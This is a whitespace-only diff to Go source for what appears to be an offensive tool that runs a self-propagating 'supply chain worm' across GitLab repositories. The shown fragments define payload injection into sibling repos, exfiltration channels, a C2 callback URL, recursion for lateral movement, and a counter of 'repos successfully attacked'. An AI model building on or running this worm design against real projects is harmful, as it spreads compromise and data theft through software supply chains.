@@ -23,15 +23,15 @@ import (
 // 4. Repeat recursively for lateral movement
 type SupplyChainWormOptions struct {
 	Common       CommonOptions
-	Payload      string      // The actual payload to inject into sibling repos
-	Discovery    string      // How to find sibling repos: "path", "topic", "language", "description"
-	DiscoveryVal string      // Value to match (e.g., "path:src/", "topic:react")
-	ExfilMethod  string      // "artifact", "http", "git", "dns"
-	ExfilTarget  string      // Target URL/domain/git-repo
-	CallbackURL  string      // C2 callback URL
-	Depth        int         // Max recursion depth (0=infinite)
-	DelayMinutes int         // Delay between propagation waves (0=immediate)
-	StableName   string      // Job name for stability across propagation waves
+	Payload      string // The actual payload to inject into sibling repos
+	Discovery    string // How to find sibling repos: "path", "topic", "language", "description"
+	DiscoveryVal string // Value to match (e.g., "path:src/", "topic:react")
+	ExfilMethod  string // "artifact", "http", "git", "dns"
+	ExfilTarget  string // Target URL/domain/git-repo
+	CallbackURL  string // C2 callback URL
+	Depth        int    // Max recursion depth (0=infinite)
+	DelayMinutes int    // Delay between propagation waves (0=immediate)
+	StableName   string // Job name for stability across propagation waves
 }
 
 // GenerateSupplyChainWormYAML returns a CI job that performs self-propagation.
@@ -270,11 +270,11 @@ func getBaseURL() string {
 
 // SupplyChainWormResult reports the outcome of a worm propagation run.
 type SupplyChainWormResult struct {
-	Promoted  int      `json:"promoted"`  // repos successfully attacked
-	Failed    int      `json:"failed"`    // repos that failed
-	Errors    int      `json:"errors"`    // non-repo errors encountered
-	Targets   []string `json:"targets"`   // repos that were targeted
-	Err       string   `json:"error,omitempty"`
+	Promoted int      `json:"promoted"` // repos successfully attacked
+	Failed   int      `json:"failed"`   // repos that failed
+	Errors   int      `json:"errors"`   // non-repo errors encountered
+	Targets  []string `json:"targets"`  // repos that were targeted
+	Err      string   `json:"error,omitempty"`
 }
 
 // RunSupplyChainWorm performs a supply chain worm attack across sibling repos.
@@ -308,8 +308,8 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 	page := int64(1)
 	for {
 		projOpts := &gitlab.ListProjectsOptions{
-			Search:     gitlab.Ptr(groupPath),
-			Owned:      gitlab.Ptr(true),
+			Search: gitlab.Ptr(groupPath),
+			Owned:  gitlab.Ptr(true),
 			ListOptions: gitlab.ListOptions{
 				PerPage: 100,
 				Page:    page,
@@ -389,8 +389,8 @@ worm-inject:
 
 // newAttackerFromClient is a local helper so this package doesn't import attack.
 type wormAttacker struct {
-	client     *gitlab.Client
-	authorName string
+	client      *gitlab.Client
+	authorName  string
 	authorEmail string
 }
 
